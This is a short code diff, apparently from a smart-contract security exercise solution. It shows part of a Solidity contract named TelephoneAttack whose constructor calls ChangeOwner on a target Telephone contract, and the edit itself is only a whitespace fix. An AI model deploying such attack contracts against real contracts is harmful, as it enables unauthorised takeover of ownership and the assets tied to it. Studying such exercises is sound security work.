@@ -15,7 +15,7 @@ contract Telephone {
     }
 }
 
-contract TelephoneAttack {    
+contract TelephoneAttack {
     constructor(address _telephone, address _addr) {
         (bool success, bytes memory err) = address(_telephone).call{value: 0}(
             abi.encodeWithSignature("ChangeOwner(address)", _addr)
